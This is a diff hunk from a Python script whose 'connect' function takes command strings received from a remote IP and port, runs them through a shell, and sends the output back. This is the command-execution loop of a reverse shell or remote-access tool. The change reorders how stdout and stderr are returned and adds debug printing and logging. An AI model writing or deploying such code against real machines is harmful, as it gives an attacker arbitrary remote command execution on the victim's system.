@@ -583,18 +583,34 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                 else:
                     try:
                         output = subprocess.run(data, timeout=10, encoding="utf8", shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
-                        if output.stderr != b"":
-                            send_data(conn, output.stderr) # send back the errors
-                        elif output.stdout == b"":
-                            send_data(conn, "ERROR/EMPTY RESPONSE --> {}".format(data))
-                        else:
-                            try:
-                                send_data(conn, output.stdout) # send back the result
-                                #send_data(conn, output.stdout)#.decode('utf-8')) # send back the result
-                            except UnicodeDecodeError:
-                                send_data(conn, output.stdout) # send back the result
+                        if DEBUG:
+                            print(f"Running Cmd:\n{data}")
+                            print(f"stderr: {output.stderr}")
+                            print(f"stdout: {output.stdout}")
+                            if OUTPUT_FILE:
+                                log_line(f"Running Cmd:\n{data}")
+                                log_line(f"stderr: {output.stderr}")
+                                log_line(f"stdout: {output.stdout}")
+
+                        if output.stdout != b"":
+                            if DEBUG:
+                                print("Received stdout")
                                 if OUTPUT_FILE:
-                                    log_line("UNICODE ERROR")
+                                    log_line("Received stdout")
+                            send_data(conn, output.stdout) # send back the result
+                        elif output.stderr != b"":
+                            if DEBUG:
+                                print("Received stderr")
+                                if OUTPUT_FILE:
+                                    log_line("Received stderr")
+                            send_data(conn, output.stderr) # send back the errors                        
+                        elif output.stdout == b"":
+                            if DEBUG:
+                                print("Received empty stdout")
+                                if OUTPUT_FILE:
+                                    log_line("Received empty stdout")
+                            send_data(conn, "ERROR/EMPTY RESPONSE --> {}".format(data))                      
+
                     except subprocess.TimeoutExpired:
                         if VERBOSE:
                             print_warn("Command Execution Timeout Expired")
